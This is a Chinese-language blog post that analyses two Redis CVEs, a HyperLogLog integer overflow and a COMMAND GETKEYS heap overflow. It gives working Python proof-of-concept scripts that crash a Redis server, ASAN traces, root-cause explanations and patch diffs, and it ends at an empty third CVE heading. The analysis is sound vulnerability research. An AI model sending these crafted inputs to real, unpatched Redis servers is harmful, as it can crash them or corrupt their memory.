---
title: "Redis漏洞分析，命令篇"
excerpt: ''

collection: analysis
category: dbms
permalink: /analysis/redis-cmd
tags: 
  - redis

layout: single
read_time: true
author_profile: false
comments: true
share: true
related: true
---

![](../images/analysis/redis/redis.png)

## 分析流程

对Redis漏洞分析的流程分为4个步骤：

1. 寻找Moderate、High级别的漏洞，寻找脆弱版本和修复版本。
2. 编译源码，指定libc、ASAN选项。
``` shell
make MALLOC=libc CFLAGS="-fsanitize=address -fno-omit-frame-pointer -O0 -g" LDFLAGS="-fsanitize=address" -j4
```
3. 寻找PoC，没有则寻找Diff。
4. 从4个方面分析漏洞：前置知识、PoC、漏洞成因、补丁。

## CVE-2025-32023 越界写，可能导致RCE

披露时间：2025年7月
复现版本：7.4.2
修复版本：7.4.5

| 严重程度 | CWE | 攻击向量 | 攻击复杂度 | 需要权限 |
| :----:  | :----: | :----: | :----: | :----: |
| 7.0 / 10 |  CWE-680 Integer Overflow to Buffer Overflow | Local | High | Low |

### 一、前置知识

HyperLogLog是Redis为基数统计场景设计的命令组，特别的，在底层实现上HyperLogLog只是另一个具有自己自定义编码的字符串。

一个编码的HyperLogLog由2个部分组成：
1. HLL头部，除了包括指示类型的魔数，encoding指定HLL是稀疏编码还是稠密编码。
2. 寄存器数组

```c
struct hllhdr {
    char magic[4];      /* "HYLL" */
    uint8_t encoding;   /* HLL_DENSE or HLL_SPARSE. */
    uint8_t notused[3]; /* Reserved for future use, must be zero. */
    uint8_t card[8];    /* Cached cardinality, little endian. */
    uint8_t registers[]; /* Data bytes. */
};
```

在只有少量寄存器有值的场景中，寄存器数组常采用稀疏编码模式，稀疏模式可以极大地压缩空间，这对内存型数据库的 Redis 来说，非常重要。

稀疏模式有3种实现，将所有寄存器的值进行编码：
1. ZERO：00xxxxxx， 2bit（00）是前缀，6bit 表示连续0的长度。
2. XZERO：01xxxxxx yyyyyyyy，2bit（01）是前缀，14bit 表示连续0的长度，最多可以表示 16384个。
3. VAL：1vvvvvxx，1bit（1）是前缀，5bit 表示要设成的值，2bit 表示非 0 值的连续长度。

在Redis中，HyperLogLog类型的key可以由set指令构造：

``` shell
127.0.0.1:6379> set key "HYLL\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
```

### 二、PoC

根据HyperLogLog值的结构，set命令构造稀疏编码的恶意值，pfcount命令触发漏洞：

``` python
import redis

r = redis.Redis('localhost', 6379)

def p8(v):
  return bytes([v])

def xzero(sz):
  assert 1 <= sz <= 0x4000
  sz -= 1
  return p8(0b01_000000 | (sz >> 8)) + p8(sz & 0xff)

HLL_SPARSE = 1

pl = b'HYLL'
pl += p8(HLL_SPARSE) + p8(0)*3
pl += p8(0)*8                   
                                
pl += xzero(0x4000) * 0x20000   # 2^14 * 2^17 = 2^31 > int
pl += p8(0b1_11111_11)          # runlen = 4, regval = 0x20

key = 'hll'

r.set(key,pl)
r.pfcount(key,key)
```

PoC触发了栈溢出，发生在src/hyperloglog.c:1090，hllMerge函数中。

``` shell
==24828==ERROR: AddressSanitizer: unknown-crash on address 0x0000800f7000 at pc 0x7f7869b29956 bp 0x7ffffc994bb0 sp 0x7ffffc994370
READ of size 1048576 at 0x0000800f7000 thread T0
#7 0x55c685e42202 in hllMerge /opt/redis-7.4.2/src/hyperloglog.c:1090
#8 0x55c685e42faf in pfcountCommand /opt/redis-7.4.2/src/hyperloglog.c:1237
#9 0x55c685c9cac4 in call /opt/redis-7.4.2/src/server.c:3575
#10 0x55c685ca0a1f in processCommand /opt/redis-7.4.2/src/server.c:4206
#11 0x55c685ce0524 in processCommandAndResetClient /opt/redis-7.4.2/src/networking.c:2505
#12 0x55c685ce0a70 in processInputBuffer /opt/redis-7.4.2/src/networking.c:2613
#13 0x55c685ce1aac in readQueryFromClient /opt/redis-7.4.2/src/networking.c:2759
#14 0x55c685ef4b84 in callHandler /opt/redis-7.4.2/src/connhelpers.h:58
#15 0x55c685ef605d in connSocketEventHandler /opt/redis-7.4.2/src/socket.c:277
#16 0x55c685c6d67d in aeProcessEvents /opt/redis-7.4.2/src/ae.c:417
#17 0x55c685c6dd70 in aeMain /opt/redis-7.4.2/src/ae.c:477
#18 0x55c685cb333e in main /opt/redis-7.4.2/src/server.c:7251
#19 0x7f7869797c89 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#20 0x7f7869797d44 in __libc_start_main_impl ../csu/libc-start.c:360
#21 0x55c685c5d970 in _start (/opt/redis-7.4.2/src/redis-server+0x141970) (BuildId: 4c01fa06e4e20630da155ad71a32d246a59b021b)
```

### 三、漏洞成因

在src/hyperloglog.c:1090，hllMerge函数中，在寄存器数组迭代时需要将每个稀疏表示的运行长度相加，导致int i中计算的总长度发生溢出。这允许攻击者覆盖HLL结构上的负偏移量，导致堆栈/堆上的越界写，这取决于HLL结构来自何处（例如，hllMerge（）采用堆栈分配的，hllSparseToDense（）采用堆分配的）。

以发生栈溢出的hllMerge函数为例，VAL编码逻辑中作了溢出break处理，但是ZERO和XZERO却没有。于是PoC首先构造了$2^{17}$个XZERO编码的块，每个块的runlen均置为$2^{14}$，在所有XZERO块处理结束之后，int类型的局部变量i发生了溢出（$2^{31}-1$），即整型溢出，最后在处理VAL编码块时绕过了溢出判断，导致了max数组处的栈溢出。

```c
int hllMerge(uint8_t *max, robj *hll) {

    int i;
    ...
    } else {
        uint8_t *p = hll->ptr, *end = p + sdslen(hll->ptr);
        long runlen, regval;

        p += HLL_HDR_SIZE;
        i = 0;
        while(p < end) {
            if (HLL_SPARSE_IS_ZERO(p)) {
                runlen = HLL_SPARSE_ZERO_LEN(p);
                i += runlen;
                p++;
            } else if (HLL_SPARSE_IS_XZERO(p)) {
                runlen = HLL_SPARSE_XZERO_LEN(p);
                i += runlen;
                p += 2;
            } else {
                runlen = HLL_SPARSE_VAL_LEN(p);
                regval = HLL_SPARSE_VAL_VALUE(p);
                if ((runlen + i) > HLL_REGISTERS) break; 
                /* src/hyperloglog.c:1090 栈溢出 */
                while(runlen--) {
👉                  if (regval > max[i]) max[i] = regval;
                    i++;
                }
                p++;
            }
        }
        if (i != HLL_REGISTERS) return C_ERR;
    }
    return C_OK;
}
```

### 四、补丁

补丁在ZERO编码和XZERO编码处理逻辑中，均加入了溢出判断，阻止了整型溢出。

```c
int hllMerge(uint8_t *max, robj *hll) {

     int i;
     ...
    } else {
         uint8_t *p = hll->ptr, *end = p + sdslen(hll->ptr);
         long runlen, regval;
+        int valid = 1;
 
         p += HLL_HDR_SIZE;
         i = 0;
         while(p < end) {
             if (HLL_SPARSE_IS_ZERO(p)) {
                 runlen = HLL_SPARSE_ZERO_LEN(p);
+                if ((runlen + i) > HLL_REGISTERS) { /* Overflow. */
+                    valid = 0;
+                    break;
+                }
                 i += runlen;
                 p++;
             } else if (HLL_SPARSE_IS_XZERO(p)) {
                 runlen = HLL_SPARSE_XZERO_LEN(p);
+                if ((runlen + i) > HLL_REGISTERS) { /* Overflow. */
+                    valid = 0;
+                    break;
+                }
                 i += runlen;
                 p += 2;
             } else {
                 runlen = HLL_SPARSE_VAL_LEN(p);
                 regval = HLL_SPARSE_VAL_VALUE(p);
-                if ((runlen + i) > HLL_REGISTERS) break; /* Overflow. */
+                if ((runlen + i) > HLL_REGISTERS) { /* Overflow. */
+                    valid = 0;
+                    break;
+                }
                 while(runlen--) {
                     if (regval > max[i]) max[i] = regval;
                     i++;
                }
                 p++;
             }
         }
-        if (i != HLL_REGISTERS) return C_ERR;
+        if (!valid || i != HLL_REGISTERS) return C_ERR;
     }
     return C_OK;
 }
```

## CVE-2023-36824 堆溢出，可能导致RCE

披露时间：2023年7月
复现版本：7.0.8
修复版本：7.0.12

| 严重程度 | CWE | 攻击向量 | 攻击复杂度 | 需要权限 |
| :----:  | :----: | :----: | :----: | :----: |
| 7.4 / 10 |  CWE-122 Heap-based Buffer Overflow | Local | High | None |
| | CWE-131 Incorrect Calculation of Buffer Size |

### 一、前置知识

Redis命令键规范用于管理键的属性，比如界定键数量的first、last、step，开始搜索键的模式begin_search_type等等。
在一个复合命令COMMAND GETKEYS中这样的命令中，内部情况如下：

``` shell
COMMAND GETKEYS ZUNIONSTORE target 3 key1 key2 key3
cmd->key_specs_num = 2
(last-first+1) = 1
(last-first+1) = 3
```
key_specs_num指示了命令规范的数量，其中每个规范的numkeys分别为1和3。

### 二、PoC

使用helper命令 *COMMAND GETKEYS* 与multi-keys命令 *ZUNIONSTORE* 构造长度大于256个键的PoC:

``` python
import redis

r = redis.Redis('localhost', 6379)

num = 257
zun = ['ZUNIONSTORE', 'target', str(num)]

for i in range(num):
    zun.append(f'key{i}')

r.command_getkeys(*zun)
```

PoC触发了堆溢出，发生在src/db.c:1860，getKeysUsingKeySpecs函数中。
``` shell
==7965==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x51d000006c88 at pc 0x557d4324e07c bp 0x7fff1ac93e90 sp 0x7fff1ac93e88 WRITE of size 4 at 0x51d000006c88 thread T0
#0 0x557d4324e07b in getKeysUsingKeySpecs /opt/redis-7.0.8/src/db.c:1860
#1 0x557d4324e2ac in getKeysFromCommandWithSpecs /opt/redis-7.0.8/src/db.c:1906
#2 0x557d431ef637 in getKeysSubcommandImpl /opt/redis-7.0.8/src/server.c:4833
#3 0x557d431e6b51 in call /opt/redis-7.0.8/src/server.c:3374
#4 0x557d431eb7fc in processCommand /opt/redis-7.0.8/src/server.c:4008
#5 0x557d43229313 in processCommandAndResetClient /opt/redis-7.0.8/src/networking.c:2469
#6 0x557d43229313 in processInputBuffer /opt/redis-7.0.8/src/networking.c:2573
#7 0x557d4323186f in readQueryFromClient /opt/redis-7.0.8/src/networking.c:2709
#8 0x557d4340e294 in callHandler /opt/redis-7.0.8/src/connhelpers.h:79
#9 0x557d4340e294 in connSocketEventHandler /opt/redis-7.0.8/src/connection.c:310
#10 0x557d431cfcb9 in aeProcessEvents /opt/redis-7.0.8/src/ae.c:436
#11 0x557d431d224c in aeProcessEvents /opt/redis-7.0.8/src/ae.c:362
#12 0x557d431d224c in aeMain /opt/redis-7.0.8/src/ae.c:496
#13 0x557d431c40ac in main /opt/redis-7.0.8/src/server.c:7156
#14 0x7fd528ef4c89 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#15 0x7fd528ef4d44 in __libc_start_main_impl ../csu/libc-start.c:360
#16 0x557d431c5b70 in _start (/opt/redis-7.0.8/src/redis-server+0x10eb70) (BuildId: bae57496e088c12a62191271c8ba8cbf422ffc71)
```

### 三、漏洞成因

在src/db.c:1860，getKeysUsingKeySpecs函数中，堆溢出发生在keys的索引时。分析函数逻辑，在for循环中，k作为循环的全局变量，是不断增加的，所以keys的空间也要随之增加，而getKeysPrepareResult函数是根据当前loop的count进行调整的。因此发生堆溢出，溢出的大小为第一次loop的count，在这里count = 1。

``` c
int getKeysUsingKeySpecs(struct redisCommand *cmd, robj **argv, int argc, int search_flags, getKeysResult *result) {

    int j, i, k = 0, last, first, step;
    keyReference *keys;

    // cmd->key_specs_num = 2
    for (j = 0; j < cmd->key_specs_num; j++) {
        ...

        // loop1: count = 1
        // loop2: count = 257
        int count = ((last - first)+1);
        keys = getKeysPrepareResult(result, count);

        for (i = first; i <= last; i += step) {
            ...

            // src/db.c:1860, 堆溢出
👉          keys[k].pos = i;
            keys[k++].flags = spec->flags;
        }
        ...
    }

    result->numkeys = k;
    return k;
}
```

需要注意的是，keys预分配空间大小为256,所以需要构造长度大于256个键才触发溢出。

```c
typedef struct {
    keyReference keysbuf[MAX_KEYS_BUFFER];       /* Pre-allocated buffer, to save heap allocations */
    keyReference *keys;                          /* Key indices array, points to keysbuf or heap */
    int numkeys;                        /* Number of key indices return */
    int size;                           /* Available array size */
} getKeysResult;
```

分析getKeysPrepareResult函数逻辑，由于getKeysUsingKeySpecs函数在for循环后才对result->numkeys进行赋值，因此函数中的memcpy不会执行。因此，即使利用k修补了getKeysUsingKeySpecs函数的堆溢出，这里仍然会产生逻辑漏洞。

``` c
keyReference *getKeysPrepareResult(getKeysResult *result, int numkeys) {

    /* Resize if necessary */
    if (numkeys > result->size) {
        if (result->keys != result->keysbuf) {
            /* We're not using a static buffer, just (re)alloc */
            result->keys = zrealloc(result->keys, numkeys * sizeof(keyReference));
        } else {
            /* We are using a static buffer, copy its contents */
            result->keys = zmalloc(numkeys * sizeof(keyReference));

            // result->numkeys = 0
👉          if (result->numkeys)
                memcpy(result->keys, result->keysbuf, result->numkeys * sizeof(keyReference));
        }
        result->size = numkeys;
    }

    return result->keys;
}
```

### 四、补丁

补丁利用result->numkeys取代k，同时修复了堆溢出、逻辑漏洞。

``` c
@@ -1937,7 +1938,7 @@ int getKeysUsingKeySpecs(struct redisCommand *cmd, robj **argv, int argc, ...) {

-   int j, i, k = 0, last, first, step;
+   int j, i, last, first, step;
    keyReference *keys;

+   result->numkeys = 0;

    for (j = 0; j < cmd->key_specs_num; j++) {
        ...

        int count = ((last - first)+1);
-       keys = getKeysPrepareResult(result, count);
+       keys = getKeysPrepareResult(result, result->numkeys + count);

        for (i = first; i <= last; i += step) {
            ...

-           keys[k].pos = i;
-           keys[k++].flags = spec->flags;
+           keys[result->numkeys].pos = i;
+           keys[result->numkeys].flags = spec->flags;
+           result->numkeys++;
        }
        ...
    }

-   result->numkeys = k;
-   return k;
+   return result->numkeys;

```

## CVE-2023-28856 


